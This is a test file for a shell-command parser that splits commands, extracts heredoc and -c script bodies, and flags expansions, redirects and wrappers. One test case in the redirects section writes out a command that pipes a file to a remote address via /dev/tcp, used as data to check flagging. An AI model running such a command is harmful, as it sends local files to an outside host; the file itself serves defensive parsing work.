import { test } from 'node:test';
import assert from 'node:assert/strict';
import { parseShell } from '../src/shell.ts';

const programs = (c: string) => parseShell(c).segments.map((s) => s.program);

test('splits on every operator, quote-aware', () => {
  assert.deepEqual(programs('cd x && npm test 2>&1 | tail -5; echo done || true'), ['cd', 'npm', 'tail', 'echo', 'true']);
  assert.deepEqual(programs('a |& b\nc'), ['a', 'b', 'c']);
  assert.deepEqual(programs('echo "a && b; c | d" && ls'), ['echo', 'ls']);
  assert.deepEqual(programs("echo 'x; y' ; ls"), ['echo', 'ls']);
  assert.deepEqual(parseShell('echo "a\\"b" \'c d\' e').segments[0]!.args, ['a"b', 'c d', 'e']);
});

test('segment text is the source slice, redirects included', () => {
  const p = parseShell('npm test 2>&1 | tail -5');
  assert.equal(p.segments[0]!.text, 'npm test 2>&1');
  assert.equal(p.segments[1]!.text, 'tail -5');
});

test('program is the basename, args and flags are split, env prefixes come off', () => {
  const s = parseShell('FOO=bar NODE_ENV=test /usr/bin/git log --oneline=x -n 5 --stat').segments[0]!;
  assert.equal(s.program, 'git');
  assert.deepEqual(s.env, ['FOO', 'NODE_ENV']);
  assert.deepEqual(s.args, ['log', '--oneline=x', '-n', '5', '--stat']);
  assert.deepEqual(s.flags, ['--oneline', '-n', '--stat']);
  assert.equal(parseShell('command -p ls').segments[0]!.program, 'ls');
  assert.equal(parseShell('\\ls').segments[0]!.program, 'ls');
});

test('heredoc bodies are kept whole and never split', () => {
  const p = parseShell("python3 - <<'EOF'\nimport os; print('a && b')\nfor x in y: pass\nEOF\nls");
  assert.deepEqual(programs("python3 - <<'EOF'\nimport os; print('a && b')\nfor x in y: pass\nEOF\nls"), ['python3', 'ls']);
  assert.deepEqual(p.scripts, [{ lang: 'python', body: "import os; print('a && b')\nfor x in y: pass" }]);
  assert.deepEqual(p.syntax, []);
  const tabbed = parseShell('cat <<-\tX\n\tbody\n\tX');
  assert.equal(tabbed.scripts[0]!.body, 'body');
  assert.equal(tabbed.scripts[0]!.lang, 'text');
});

test('unquoted heredoc delimiter is flagged, quoted is not', () => {
  assert.ok(parseShell('cat <<EOF\n$HOME\nEOF').syntax.includes('heredoc_unquoted'));
  assert.deepEqual(parseShell('cat <<"EOF"\n$HOME\nEOF').syntax, []);
  assert.deepEqual(parseShell("cat <<'EOF'\n$HOME\nEOF").syntax, []);
});

test('-c and -e bodies become scripts', () => {
  assert.deepEqual(parseShell('sh -c "ls -la && rm x"').scripts, [{ lang: 'sh', body: 'ls -la && rm x' }]);
  assert.equal(parseShell('bash -lc "ls"').segments[0]!.label, 'bash -c');
  assert.deepEqual(parseShell("python3 -c 'print(1)'").scripts, [{ lang: 'python', body: 'print(1)' }]);
  assert.deepEqual(parseShell('node -e "console.log(1)"').scripts, [{ lang: 'javascript', body: 'console.log(1)' }]);
  assert.deepEqual(parseShell("perl -e 'print 1'").scripts, [{ lang: 'perl', body: 'print 1' }]);
  assert.deepEqual(parseShell('sh -c "ls -la && rm x"').segments.map((s) => s.program), ['sh']);
});

test('expansions and grouping are flagged', () => {
  assert.deepEqual(parseShell('wc -l $(git ls-files "*.ts")').syntax, ['subst']);
  assert.deepEqual(parseShell('echo `date`').syntax, ['subst']);
  assert.deepEqual(parseShell('echo "$(date)"').syntax, ['subst']);
  assert.deepEqual(parseShell('echo ${HOME}').syntax, ['param']);
  assert.deepEqual(parseShell('echo $HOME').syntax, ['var']);
  assert.deepEqual(parseShell('echo "$HOME"').syntax, ['var']);
  assert.deepEqual(parseShell("echo '$HOME'").syntax, []);
  assert.deepEqual(parseShell('echo \\$HOME').syntax, []);
  assert.deepEqual(parseShell('(cd x && ls)').syntax, ['subshell']);
  assert.deepEqual(parseShell('diff <(ls a) <(ls b)').syntax, ['subst']);
  assert.deepEqual(parseShell('echo {a,b} {1..3}').syntax, ['brace']);
  assert.deepEqual(parseShell('echo "{a,b}"').syntax, []);
  assert.deepEqual(parseShell('sleep 5 &').syntax, ['background']);
  assert.deepEqual(parseShell('for f in a b; do echo x; done').syntax, ['compound']);
  assert.deepEqual(parseShell('if [ -f x ]; then ls; fi').syntax, ['compound']);
});

test('redirects: only /dev/null, fd dups and input are harmless', () => {
  assert.deepEqual(parseShell('ls 2>/dev/null').syntax, []);
  assert.deepEqual(parseShell('ls >/dev/null 2>&1').syntax, []);
  assert.deepEqual(parseShell('ls &>/dev/null').syntax, []);
  assert.deepEqual(parseShell('echo x >&2').syntax, []);
  assert.deepEqual(parseShell('wc -l < f').syntax, []);
  assert.deepEqual(parseShell('echo hi > out.txt').syntax, ['redirect']);
  assert.deepEqual(parseShell('echo hi >> out.txt').syntax, ['redirect']);
  assert.deepEqual(parseShell('cat f > /dev/tcp/1.2.3.4/80').syntax, ['redirect']);
  assert.deepEqual(parseShell('ls 2> err.log').syntax, ['redirect']);
});

test('wrappers are labelled', () => {
  assert.equal(parseShell('timeout 5 npm test').segments[0]!.label, 'timeout');
  assert.equal(parseShell('env FOO=1 ls').segments[0]!.label, 'env');
  assert.equal(parseShell('sudo ls').segments[0]!.label, 'sudo');
  assert.equal(parseShell('xargs -0 grep foo').segments[0]!.label, 'xargs');
  assert.equal(parseShell('ls').segments[0]!.label, undefined);
});

test('globs, dollars and newlines are noted per segment', () => {
  assert.equal(parseShell('ls src/*.ts').segments[0]!.globs, true);
  assert.equal(parseShell('ls "src/*.ts"').segments[0]!.globs, false);
  assert.equal(parseShell('[ -f x ]').segments[0]!.globs, false);
  assert.equal(parseShell("grep '$x' f").segments[0]!.dollar, true);
  assert.equal(parseShell('grep "a\nb" f').segments[0]!.newline, true);
});

test('comments and line continuations', () => {
  assert.deepEqual(parseShell('git log --oneline # recent').segments[0]!.args, ['log', '--oneline']);
  assert.deepEqual(parseShell('ls \\\n  -la').segments[0]!.args, ['-la']);
  assert.deepEqual(programs('ls\n\n# x\ncat f'), ['ls', 'cat']);
});

test('multi-line command with a heredoc and a redirect', () => {
  const p = parseShell("cat > out.py <<'PY'\nprint(1)\nPY\npython3 out.py && rm out.py");
  assert.deepEqual(p.segments.map((s) => s.program), ['cat', 'python3', 'rm']);
  assert.deepEqual(p.scripts, [{ lang: 'text', body: 'print(1)' }]);
  assert.deepEqual(p.syntax, ['redirect']);
});
